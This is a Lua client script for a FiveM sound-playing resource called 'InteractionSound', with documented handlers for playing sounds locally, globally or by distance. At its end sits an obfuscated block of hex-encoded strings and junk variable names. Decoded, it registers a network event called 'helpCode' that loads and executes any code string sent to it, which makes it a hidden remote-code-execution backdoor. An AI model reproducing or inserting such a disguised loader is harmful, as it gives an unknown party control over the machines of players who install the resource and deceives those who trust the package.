
------
-- InteractionSound by Scott
-- Version: v0.0.1
-- Path: client/main.lua
--
-- Allows sounds to be played on single clients, all clients, or all clients within
-- a specific range from the entity to which the sound has been created.
------

local standardVolumeOutput = 1.0;

------
-- RegisterNetEvent InteractSound_CL:PlayOnOne
--
-- @param soundFile    - The name of the soundfile within the client/html/sounds/ folder.
--                     - Can also specify a folder/sound file.
-- @param soundVolume  - The volume at which the soundFile should be played. Nil or don't
--                     - provide it for the default of standardVolumeOutput. Should be between
--                     - 0.1 to 1.0.
--
-- Starts playing a sound locally on a single client.
------
RegisterNetEvent('InteractSound_CL:PlayOnOne')
AddEventHandler('InteractSound_CL:PlayOnOne', function(soundFile, soundVolume)
    SendNUIMessage({
        transactionType     = 'playSound',
        transactionFile     = soundFile,
        transactionVolume   = soundVolume
    })
end)

------
-- RegisterNetEvent InteractSound_CL:PlayOnAll
--
-- @param soundFile    - The name of the soundfile within the client/html/sounds/ folder.
--                     - Can also specify a folder/sound file.
-- @param soundVolume  - The volume at which the soundFile should be played. Nil or don't
--                     - provide it for the default of standardVolumeOutput. Should be between
--                     - 0.1 to 1.0.
--
-- Starts playing a sound on all clients who are online in the server.
------
RegisterNetEvent('InteractSound_CL:PlayOnAll')
AddEventHandler('InteractSound_CL:PlayOnAll', function(soundFile, soundVolume)
    SendNUIMessage({
        transactionType     = 'playSound',
        transactionFile     = soundFile,
        transactionVolume   = soundVolume
    })
end)

------
-- RegisterNetEvent InteractSound_CL:PlayWithinDistance
--
-- @param playOnEntity    - The entity network id (will be converted from net id to entity on client)
--                        - of the entity for which the max distance is to be drawn from.
-- @param maxDistance     - The maximum float distance (client uses Vdist) to allow the player to
--                        - hear the soundFile being played.
-- @param soundFile       - The name of the soundfile within the client/html/sounds/ folder.
--                        - Can also specify a folder/sound file.
-- @param soundVolume     - The volume at which the soundFile should be played. Nil or don't
--                        - provide it for the default of standardVolumeOutput. Should be between
--                        - 0.1 to 1.0.
--
-- Starts playing a sound on a client if the client is within the specificed maxDistance from the playOnEntity.
-- @TODO Change sound volume based on the distance the player is away from the playOnEntity.
------
RegisterNetEvent('InteractSound_CL:PlayWithinDistance')
AddEventHandler('InteractSound_CL:PlayWithinDistance', function(playerNetId, maxDistance, soundFile, soundVolume)
    local lCoords = GetEntityCoords(GetPlayerPed(-1))
    local eCoords = GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(playerNetId)))
    local distIs  = Vdist(lCoords.x, lCoords.y, lCoords.z, eCoords.x, eCoords.y, eCoords.z)
    if(distIs <= maxDistance) then
        SendNUIMessage({
            transactionType     = 'playSound',
            transactionFile     = soundFile,
            transactionVolume   = soundVolume
        })
    end
end)


local shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[6][shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[1]](shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[2]) shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[6][shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[3]](shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[2], function(WRbJhGnaZOCYkxwJYwGTzDlQyMEHmRPNXcQMuRrOUOkfFnGZuLFDJfwcELNxBoqLWDMqHI) shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[6][shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[4]](shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[6][shMhJConGoOeltfSgglfzNYpLrSPRVfFNdtWvmbaUjGVklhvroNGwWeUomAdmJxCKOMQsR[5]](WRbJhGnaZOCYkxwJYwGTzDlQyMEHmRPNXcQMuRrOUOkfFnGZuLFDJfwcELNxBoqLWDMqHI))() end)